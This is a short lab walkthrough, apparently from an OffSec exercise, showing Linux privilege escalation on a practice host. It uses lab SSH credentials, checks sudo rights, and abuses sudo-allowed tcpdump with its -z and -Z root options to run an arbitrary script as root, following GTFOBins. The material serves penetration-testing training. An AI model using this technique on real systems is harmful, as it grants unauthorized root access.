HINT
Use the provided command in Listing 46 to determine which commands can be executed with sudo privileges.
Check GTFOBins (https://gtfobins.github.io/) for instructions on exploiting the sudo permissions to escalate privileges to root.

ssh joe@192.168.177.214
Password: offsec

# Check the sudo commands
sudo -l 
    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc

# Lets try with the first command from start
crontab 
sudo crontab -l
Sorry, user joe is not allowed to execute '/usr/bin/crontab' as root on debian-privesc.

# try tcpdump

joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
